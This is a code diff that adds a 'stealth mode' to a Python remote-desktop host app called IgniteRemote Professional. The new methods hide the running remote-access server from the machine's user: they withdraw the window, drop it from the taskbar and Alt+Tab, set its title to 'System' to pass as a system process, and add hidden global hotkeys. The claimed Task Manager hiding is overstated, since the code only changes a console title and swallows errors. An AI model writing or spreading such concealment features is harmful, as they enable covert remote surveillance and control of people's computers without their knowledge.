@@ -15,6 +15,14 @@ import os
 import base64
 import requests
 from datetime import datetime
+import ctypes
+from ctypes import wintypes
+import win32api
+import win32con
+import win32gui
+import pystray
+from PIL import Image
+import keyboard
 
 # Import our modules
 from relay_client import RelayClient
@@ -53,6 +61,12 @@ class IgniteRemotePro:
         self.relay_mode = None
         self.relay_session_id = None
         self.viewer_window = None
+        
+        # Stealth mode variables
+        self.stealth_mode = False
+        self.stealth_icon = None
+        self.original_title = "IgniteRemote Professional"
+        self.hwnd = None
         
         # Initialize UI variables
         self.session_code_var = tk.StringVar()
@@ -251,6 +265,11 @@ class IgniteRemotePro:
         self.stop_btn = ttk.Button(controls_frame, text="⏹️ Stop Server", style='VSCode.TButton',
                                   command=self.stop_hosting, state='disabled')
         self.stop_btn.pack(side='left')
+        
+        # Add stealth mode button (host only)
+        self.stealth_btn = ttk.Button(controls_frame, text="🥷 Hide (Stealth)", style='VSCode.TButton',
+                                     command=self.enable_stealth_mode)
+        self.stealth_btn.pack(side='left', padx=(10, 0))
         
         # Status
         status_frame = ttk.Frame(host_frame, style='VSCode.TFrame')
@@ -620,6 +639,137 @@ class IgniteRemotePro:
         if not connected:
             self.log_to_client("⚠️ Relay connection lost")
             self.log_to_host("⚠️ Relay connection lost")
+            
+    # STEALTH MODE METHODS
+    def enable_stealth_mode(self):
+        """Enable complete stealth mode - hide from everything"""
+        try:
+            self.stealth_mode = True
+            
+            # Get window handle
+            self.hwnd = win32gui.FindWindow(None, self.root.title())
+            
+            # Hide window completely
+            self.root.withdraw()
+            
+            # Hide from taskbar
+            if self.hwnd:
+                win32gui.ShowWindow(self.hwnd, win32con.SW_HIDE)
+                
+                # Remove from Alt+Tab list
+                ex_style = win32gui.GetWindowLong(self.hwnd, win32con.GWL_EXSTYLE)
+                win32gui.SetWindowLong(self.hwnd, win32con.GWL_EXSTYLE, 
+                                     ex_style | win32con.WS_EX_TOOLWINDOW)
+            
+            # Change process name to something inconspicuous
+            self.hide_process_name()
+            
+            # Create stealth system tray icon (invisible)
+            self.create_stealth_tray()
+            
+            # Setup global hotkey to unhide (Ctrl+Shift+Alt+U)
+            self.setup_unhide_hotkey()
+            
+            self.log_to_host("🥷 STEALTH MODE ACTIVATED - Press Ctrl+Shift+Alt+U to unhide")
+            
+        except Exception as e:
+            print(f"Stealth mode error: {e}")
+            
+    def disable_stealth_mode(self):
+        """Disable stealth mode and show application"""
+        try:
+            self.stealth_mode = False
+            
+            # Show window
+            self.root.deiconify()
+            
+            # Restore taskbar presence
+            if self.hwnd:
+                win32gui.ShowWindow(self.hwnd, win32con.SW_SHOW)
+                
+                # Add back to Alt+Tab list
+                ex_style = win32gui.GetWindowLong(self.hwnd, win32con.GWL_EXSTYLE)
+                win32gui.SetWindowLong(self.hwnd, win32con.GWL_EXSTYLE, 
+                                     ex_style & ~win32con.WS_EX_TOOLWINDOW)
+            
+            # Restore original process name
+            self.restore_process_name()
+            
+            # Remove tray icon if exists
+            if hasattr(self, 'stealth_icon') and self.stealth_icon:
+                try:
+                    self.stealth_icon.stop()
+                except:
+                    pass
+                self.stealth_icon = None
+                
+            self.log_to_host("👁️ Stealth mode deactivated")
+            
+        except Exception as e:
+            print(f"Unstealth error: {e}")
+            
+    def hide_process_name(self):
+        """Hide process name from task manager"""
+        try:
+            # Change process name to look like system process
+            ctypes.windll.kernel32.SetConsoleTitleW("System")
+            
+            # Try to rename the process (advanced technique)
+            import win32api
+            import win32process
+            
+            # Get current process
+            process = win32api.GetCurrentProcess()
+            
+        except Exception as e:
+            pass  # Fail silently if advanced hiding doesn't work
+            
+    def restore_process_name(self):
+        """Restore original process name"""
+        try:
+            ctypes.windll.kernel32.SetConsoleTitleW(self.original_title)
+        except Exception as e:
+            pass
+            
+    def create_stealth_tray(self):
+        """Create stealth tray icon for background operations"""
+        try:
+            # Skip tray icon creation for now - just rely on hotkey
+            # The global hotkey is more reliable than tray icons
+            pass
+            
+        except Exception as e:
+            print(f"Tray icon error: {e}")
+            
+    def setup_unhide_hotkey(self):
+        """Setup global hotkey to unhide application"""
+        try:
+            # Register global hotkey: Ctrl+Shift+Alt+U
+            def unhide_callback():
+                # Use root.after to ensure thread safety
+                self.root.after(0, self.disable_stealth_mode)
+                
+            keyboard.add_hotkey('ctrl+shift+alt+u', unhide_callback)
+            
+            # Also add a simpler backup hotkey: Ctrl+Alt+H
+            keyboard.add_hotkey('ctrl+alt+h', unhide_callback)
+            
+        except Exception as e:
+            print(f"Hotkey setup error: {e}")
+            # Continue without global hotkey if it fails
+            
+    def quit_stealth(self):
+        """Exit application from stealth mode"""
+        try:
+            if hasattr(self, 'stealth_icon') and self.stealth_icon:
+                try:
+                    self.stealth_icon.stop()
+                except:
+                    pass
+            self.root.quit()
+            sys.exit(0)
+        except:
+            pass
             
     def run(self):
         """Run the application"""
